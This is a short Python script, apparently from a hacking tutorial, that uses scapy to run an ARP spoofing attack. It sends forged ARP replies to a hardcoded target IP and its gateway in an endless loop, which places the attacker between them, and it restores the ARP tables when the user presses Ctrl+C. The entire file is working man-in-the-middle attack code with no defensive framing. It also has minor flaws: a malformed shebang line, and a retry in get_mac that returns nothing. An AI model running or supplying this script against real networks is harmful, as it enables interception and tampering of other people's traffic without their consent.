#! usr/bin/env python
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast/arp_request
    answered_list = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        get_mac(ip)

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    scapy.send(packet, verbose= False)

def restore(destination_ip,source_ip):
    destination_mac= get_mac(destination_ip)
    source_mac= get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc= source_ip, hwsrc=source_mac )
    scapy.send(packet,count=4, verbose=False)


target_ip="192.168.29.8"
gateway_ip="192.168.29.1"

try:
    sent_packet = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        print("\r[+] send packets",sent_packet,end="")
        sent_packet+=2
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected ctrl+c .....\nResetting ARP tables ..... \npleasw wait....")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)



